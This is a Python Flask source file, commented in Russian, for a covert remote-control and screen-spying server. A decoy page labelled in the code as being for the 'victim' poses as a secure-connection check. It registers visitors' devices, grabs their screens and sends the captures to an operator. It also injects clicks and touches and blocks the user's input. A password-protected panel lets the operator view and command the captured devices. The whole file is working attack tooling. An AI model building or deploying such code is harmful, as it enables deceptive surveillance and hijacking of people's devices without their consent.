#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import sys
from datetime import datetime
from flask import Flask, request, jsonify
from flask_sock import Sock
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
sock = Sock(app)

# ========== Хранилище ==========
devices = {}          # device_id -> {ws, deviceType, last_seen, online, screen, nick}
admin_sessions = {}   # session_token -> websocket
ADMIN_PASSWORD_HASH = generate_password_hash("DDS_MrL_2026")

# ========== Маскировочная страница (для жертвы) ==========
MASK_PAGE = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Проверка защищённого соединения</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0b0e1a;color:#c0caf5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;padding:20px;}
    .loader{width:60px;height:60px;border:4px solid #2a2f4a;border-top:4px solid #7aa2f7;border-radius:50%;animation:spin 1.2s cubic-bezier(0.5,0,0.5,1) infinite;}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .status{color:#565f89;margin-top:20px;font-size:14px;letter-spacing:1px;}
    .hidden{display:none;}
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="status">Установка защищённого канала...</div>
  <script>
    (function() {
      const WS_URL = "wss://"+location.host+"/ws";
      let ws = new WebSocket(WS_URL);
      const deviceId = localStorage.getItem("dds_id") || crypto.randomUUID();
      localStorage.setItem("dds_id", deviceId);
      let deviceType = "pc";
      if(/android|iphone|ipad|tablet/i.test(navigator.userAgent)) deviceType = "tablet";
      if(/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = "phone";

      ws.onopen = function() {
        ws.send(JSON.stringify({type:"register", id:deviceId, deviceType:deviceType}));
        document.querySelector(".status").innerText = "Соединение установлено";
        setTimeout(function(){document.querySelector(".loader").classList.add("hidden");}, 1500);
      };

      async function captureScreen() {
        try {
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 5 }, audio: false });
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);
          const bitmap = await imageCapture.grabFrame();
          const canvas = document.createElement("canvas");
          canvas.width = Math.min(bitmap.width, 1024);
          canvas.height = Math.min(bitmap.height, 768);
          const ctx = canvas.getContext("2d");
          ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL("image/jpeg", 0.5);
          ws.send(JSON.stringify({type:"screen", data:dataUrl, id:deviceId}));
          track.stop();
          stream.getTracks().forEach(function(t){t.stop();});
        } catch(e){}
      }

      function injectMouseMove(x, y) {
        document.dispatchEvent(new MouseEvent("mousemove", { clientX: x, clientY: y, bubbles: true }));
      }
      function injectClick(x, y) {
        document.dispatchEvent(new MouseEvent("click", { clientX: x, clientY: y, bubbles: true }));
      }
      function injectTouch(x, y) {
        try {
          const touch = new Touch({ identifier: 0, target: document.body, clientX: x, clientY: y, pageX: x, pageY: y });
          const ev = new TouchEvent("touchstart", { touches: [touch], changedTouches: [touch], bubbles: true });
          document.dispatchEvent(ev);
        } catch(e){}
      }

      let mouseBlocked = false;
      function blockMouse(enable) {
        mouseBlocked = enable;
        if(enable) {
          document.body.style.pointerEvents = "none";
          document.addEventListener("mousedown", function(e){e.preventDefault();}, true);
          document.addEventListener("touchstart", function(e){e.preventDefault();}, true);
        } else {
          document.body.style.pointerEvents = "auto";
        }
      }

      ws.onmessage = function(e) {
        try {
          const data = JSON.parse(e.data);
          if(data.type === "mouse_move") injectMouseMove(data.x, data.y);
          else if(data.type === "click") injectClick(data.x, data.y);
          else if(data.type === "touch") injectTouch(data.x, data.y);
          else if(data.type === "block_mouse") blockMouse(true);
          else if(data.type === "unblock_mouse") blockMouse(false);
          else if(data.type === "capture_screen") captureScreen();
          else if(data.type === "ping") ws.send(JSON.stringify({type:"pong", id:deviceId}));
        } catch(err){}
      };

      setInterval(function() {
        if(ws.readyState === 1) ws.send(JSON.stringify({type:"ping", id:deviceId}));
      }, 15000);

      ws.onclose = function() {
        document.querySelector(".status").innerText = "Переподключение...";
        setTimeout(function(){ window.location.reload(); }, 3000);
      };
    })();
  </script>
</body>
</html>
'''

# ========== АДМИН-ПАНЕЛЬ (без Vue, работает на любом телефоне) ==========
ADMIN_PANEL = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>DDS_MrL Control</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0d1117;color:#c9d1d9;font-family:system-ui,-apple-system,sans-serif;padding:15px;max-width:800px;margin:auto;}
    .login-box{background:#161b22;padding:35px;border-radius:14px;text-align:center;margin-top:60px;border:1px solid #30363d;}
    .login-box h2{color:#58a6ff;margin-bottom:15px;}
    .login-box input{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#fff;font-size:16px;}
    .login-box button{width:100%;padding:14px;background:#238636;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;}
    .login-box .error{color:#f85149;margin-top:8px;font-size:14px;}
    .hidden{display:none !important;}
    .stat{display:inline-block;background:#21262d;padding:4px 14px;border-radius:20px;margin:3px 3px 0 0;font-size:13px;}
    .device-card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px;margin-bottom:12px;}
    .device-card.online{border-color:#2ea043;}
    .device-card.offline{border-color:#da3633;opacity:0.6;}
    .device-card .type{border:1px solid #30363d;padding:2px 10px;border-radius:12px;font-size:11px;display:inline-block;}
    .device-card .id{font-size:12px;color:#8b949e;word-break:break-all;margin:4px 0;}
    .device-card .time{font-size:10px;color:#484f58;}
    .btn-group{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px;}
    .btn-group button{flex:1;min-width:50px;padding:6px 8px;font-size:11px;border-radius:6px;border:1px solid #30363d;background:#21262d;color:#c9d1d9;cursor:pointer;}
    .btn-group .primary{color:#58a6ff;border-color:#58a6ff;}
    .btn-group .danger{color:#f85149;border-color:#f85149;}
    .screen-img{max-width:100%;border-radius:6px;margin-top:8px;border:1px solid #30363d;}
    .viewer-area{background:#161b22;padding:15px;border-radius:10px;margin-top:15px;border:1px solid #30363d;}
    .viewer-area img{max-width:100%;border-radius:6px;}
    .viewer-controls{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px;align-items:center;}
    .viewer-controls input[type="number"]{width:60px;padding:4px;background:#0d1117;border:1px solid #30363d;color:#fff;border-radius:4px;}
    .viewer-controls button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;}
    .viewer-controls .danger{color:#f85149;border-color:#f85149;}
    .viewer-controls .primary{color:#58a6ff;border-color:#58a6ff;}
    h1{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;margin-bottom:15px;font-size:22px;}
    .stats{margin-bottom:12px;}
  </style>
</head>
<body>
<div id="app">
  <!-- Логин -->
  <div id="loginBox" class="login-box">
    <h2>🔐 DDS_MrL Console</h2>
    <input type="password" id="passwordInput" placeholder="Пароль доступа" autocomplete="off">
    <button id="loginBtn">Войти</button>
    <div id="loginError" class="error hidden">Неверный пароль</div>
    <p style="color:#8b949e;font-size:12px;margin-top:10px;">Секретный вход</p>
  </div>

  <!-- Панель управления -->
  <div id="panel" class="hidden">
    <h1>🛸 DDS_MrL — Управление</h1>
    <div class="stats">
      <span class="stat" id="onlineCount">🟢 0 онлайн</span>
      <span class="stat" id="phoneCount">📱 0 телефонов</span>
      <span class="stat" id="pcCount">💻 0 ПК</span>
      <span class="stat" id="tabletCount">📟 0 планшетов</span>
    </div>
    <div id="deviceList"></div>

    <!-- Просмотр -->
    <div id="viewerArea" class="viewer-area hidden">
      <h3 id="viewerTitle">Просмотр</h3>
      <img id="viewerScreen" src="" />
      <div class="viewer-controls">
        <button class="primary" onclick="captureScreen(currentViewId)">📸 Обновить</button>
        <button class="danger" onclick="blockMouse(currentViewId, true)">🖱️ Заблок.</button>
        <button onclick="blockMouse(currentViewId, false)">🖱️ Разблок.</button>
        <span>X</span><input type="number" id="mx" value="300">
        <span>Y</span><input type="number" id="my" value="200">
        <button onclick="moveMouse(currentViewId, parseInt(document.getElementById('mx').value), parseInt(document.getElementById('my').value))">⬆️ Двиг</button>
        <button onclick="sendClick(currentViewId, parseInt(document.getElementById('mx').value), parseInt(document.getElementById('my').value))">🔘 Клик</button>
      </div>
    </div>
  </div>
</div>

<script>
  (function() {
    let ws = null;
    let sessionId = crypto.randomUUID();
    let devices = {};
    let currentViewId = null;
    let logged = false;
    let reconnectTimer = null;

    const loginBox = document.getElementById('loginBox');
    const panel = document.getElementById('panel');
    const passwordInput = document.getElementById('passwordInput');
    const loginError = document.getElementById('loginError');

    // Логин
    window.login = function() {
      const pwd = passwordInput.value;
      if(!pwd) { loginError.classList.remove('hidden'); return; }
      loginError.classList.add('hidden');
      fetch('/admin/login', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({password: pwd})
      }).then(function(r){ return r.json(); }).then(function(data) {
        if(data.ok) {
          logged = true;
          loginBox.classList.add('hidden');
          panel.classList.remove('hidden');
          connectWS();
        } else {
          loginError.classList.remove('hidden');
        }
      }).catch(function() {
        loginError.classList.remove('hidden');
        loginError.innerText = 'Ошибка соединения с сервером';
      });
    };

    document.getElementById('loginBtn').addEventListener('click', window.login);
    passwordInput.addEventListener('keyup', function(e) { if(e.key === 'Enter') window.login(); });

    // WebSocket для админа
    function connectWS() {
      if(ws) { try { ws.close(); } catch(e){} }
      ws = new WebSocket('wss://' + location.host + '/admin/ws');
      ws.onopen = function() {
        ws.send(JSON.stringify({type:'admin_register', session:sessionId}));
      };
      ws.onmessage = function(e) {
        try {
          const data = JSON.parse(e.data);
          if(data.type === 'devices_list') {
            devices = data.devices || {};
            renderDevices();
          } else if(data.type === 'device_update') {
            devices[data.id] = data.data;
            renderDevices();
          } else if(data.type === 'screen_update') {
            if(currentViewId === data.id) {
              document.getElementById('viewerScreen').src = data.screen;
            }
            if(devices[data.id]) devices[data.id].screen = data.screen;
            renderDevices();
          } else if(data.type === 'device_offline') {
            if(devices[data.id]) { devices[data.id].online = false; renderDevices(); }
          }
        } catch(err) { console.error('WS parse error', err); }
      };
      ws.onclose = function() {
        if(reconnectTimer) clearTimeout(reconnectTimer);
        reconnectTimer = setTimeout(function() { if(logged) connectWS(); }, 3000);
      };
      ws.onerror = function() { ws.close(); };
    }

    // Отправка команд
    window.sendCmd = function(id, cmd, payload) {
      if(ws && ws.readyState === 1) {
        let msg = {type:'cmd', target:id, cmd:cmd};
        if(payload) { for(let k in payload) msg[k] = payload[k]; }
        ws.send(JSON.stringify(msg));
      } else {
        console.warn('WS not ready');
      }
    };

    window.captureScreen = function(id) { sendCmd(id, 'capture_screen'); };
    window.blockMouse = function(id, block) { sendCmd(id, block ? 'block_mouse' : 'unblock_mouse'); };
    window.moveMouse = function(id, x, y) { sendCmd(id, 'mouse_move', {x: (x||0), y: (y||0)}); };
    window.sendClick = function(id, x, y) { sendCmd(id, 'click', {x: (x||0), y: (y||0)}); };

    window.viewDevice = function(id) {
      currentViewId = id;
      const area = document.getElementById('viewerArea');
      area.classList.remove('hidden');
      document.getElementById('viewerTitle').innerText = 'Просмотр: ' + id.slice(0,8) + '...';
      const scr = (devices[id] && devices[id].screen) ? devices[id].screen : '';
      document.getElementById('viewerScreen').src = scr;
    };

    // Рендер устройств
    function renderDevices() {
      let html = '';
      let online = 0, phones = 0, pcs = 0, tablets = 0;
      for(let id in devices) {
        let d = devices[id];
        if(!d) continue;
        if(d.online) online++;
        if(d.deviceType === 'phone') phones++;
        else if(d.deviceType === 'pc') pcs++;
        else if(d.deviceType === 'tablet') tablets++;
        let cls = d.online ? 'online' : 'offline';
        let scr = (d.screen) ? '<img src="'+d.screen+'" class="screen-img" />' : '';
        let lastSeen = d.last_seen || '—';
        html += '<div class="device-card '+cls+'">';
        html += '<div><span class="type">'+d.deviceType+'</span> <span style="float:right;">'+(d.online ? '🟢' : '🔴')+'</span></div>';
        html += '<div class="id">'+id.slice(0,8)+'...'+id.slice(-4)+'</div>';
        html += '<div class="time">последний: '+lastSeen+'</div>';
        html += '<div class="btn-group">';
        html += '<button class="primary" onclick="captureScreen(\''+id+'\')">📸 Скрин</button>';
        html += '<button class="primary" onclick="viewDevice(\''+id+'\')">👁️ Смотреть</button>';
        html += '<button class="danger" onclick="blockMouse(\''+id+'\', true)">🖱️ Заблок.</button>';
        html += '<button onclick="blockMouse(\''+id+'\', false)">🖱️ Разблок.</button>';
        html += '<button onclick="sendClick(\''+id+'\', 100, 100)">🔘 Клик</button>';
        html += '<button onclick="moveMouse(\''+id+'\', 200, 200)">⬆️ Двиг</button>';
        html += '</div>'+scr+'</div>';
      }
      document.getElementById('deviceList').innerHTML = html;
      document.getElementById('onlineCount').innerText = '🟢 '+online+' онлайн';
      document.getElementById('phoneCount').innerText = '📱 '+phones+' телефонов';
      document.getElementById('pcCount').innerText = '💻 '+pcs+' ПК';
      document.getElementById('tabletCount').innerText = '📟 '+tablets+' планшетов';

      // Если смотрим на устройство, но его нет — скрыть просмотр
      if(currentViewId && !devices[currentViewId]) {
        document.getElementById('viewerArea').classList.add('hidden');
        currentViewId = null;
      }
    }

    // Ручной вход в консоль для отладки
    console.log('DDS_MrL Admin загружен. Для входа введите пароль.');
  })();
</script>
</body>
</html>
'''

# ========== Маршруты ==========
@app.route('/')
def mask():
    return MASK_PAGE

@app.route('/admin')
def admin_panel():
    return ADMIN_PANEL

@app.route('/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    if data and check_password_hash(ADMIN_PASSWORD_HASH, data.get('password', '')):
        return jsonify({'ok': True})
    return jsonify({'ok': False}), 401

# ========== WebSocket для устройств (жертвы) ==========
@sock.route('/ws')
def device_ws(ws):
    device_id = None
    try:
        while True:
            msg = ws.receive()
            if not msg:
                break
            data = json.loads(msg)
            if data.get('type') == 'register':
                device_id = data['id']
                dev_type = data.get('deviceType', 'pc')
                devices[device_id] = {
                    'ws': ws,
                    'deviceType': dev_type,
                    'last_seen': datetime.now().isoformat(),
                    'online': True,
                    'screen': None,
                    'nick': None
                }
                broadcast_devices()
            elif data.get('type') == 'ping' and device_id:
                if device_id in devices:
                    devices[device_id]['last_seen'] = datetime.now().isoformat()
                    devices[device_id]['online'] = True
                    broadcast_devices()
            elif data.get('type') == 'screen' and device_id:
                if device_id in devices:
                    devices[device_id]['screen'] = data['data']
                    for admin_ws in admin_sessions.values():
                        try:
                            admin_ws.send(json.dumps({
                                'type': 'screen_update',
                                'id': device_id,
                                'screen': data['data']
                            }))
                        except:
                            pass
            elif data.get('type') == 'pong' and device_id:
                if device_id in devices:
                    devices[device_id]['last_seen'] = datetime.now().isoformat()
                    devices[device_id]['online'] = True
    except Exception as e:
        print(f"Device WS error: {e}", file=sys.stderr)
    finally:
        if device_id and device_id in devices:
            devices[device_id]['online'] = False
            broadcast_devices()

# ========== WebSocket для админа ==========
@sock.route('/admin/ws')
def admin_ws(ws):
    session = None
    try:
        while True:
            msg = ws.receive()
            if not msg:
                break
            data = json.loads(msg)
            if data.get('type') == 'admin_register':
                session = data.get('session')
                if session:
                    admin_sessions[session] = ws
                # Отправить текущий список устройств (без ws-объектов)
                clean_devices = {}
                for k, v in devices.items():
                    clean_devices[k] = {key: val for key, val in v.items() if key != 'ws'}
                ws.send(json.dumps({
                    'type': 'devices_list',
                    'devices': clean_devices
                }))
            elif data.get('type') == 'cmd' and session:
                target = data.get('target')
                if target and target in devices and devices[target].get('online'):
                    dev_ws = devices[target].get('ws')
                    if dev_ws:
                        try:
                            dev_ws.send(json.dumps({
                                'type': data.get('cmd'),
                                'x': data.get('x', 0),
                                'y': data.get('y', 0)
                            }))
                        except:
                            devices[target]['online'] = False
                            broadcast_devices()
    except Exception as e:
        print(f"Admin WS error: {e}", file=sys.stderr)
    finally:
        if session and session in admin_sessions:
            del admin_sessions[session]

# ========== Вспомогательные функции ==========
def broadcast_devices():
    clean_devices = {}
    for k, v in devices.items():
        clean_devices[k] = {key: val for key, val in v.items() if key != 'ws'}
    data = {
        'type': 'devices_list',
        'devices': clean_devices
    }
    for ws in list(admin_sessions.values()):
        try:
            ws.send(json.dumps(data))
        except:
            pass

# ========== Запуск ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
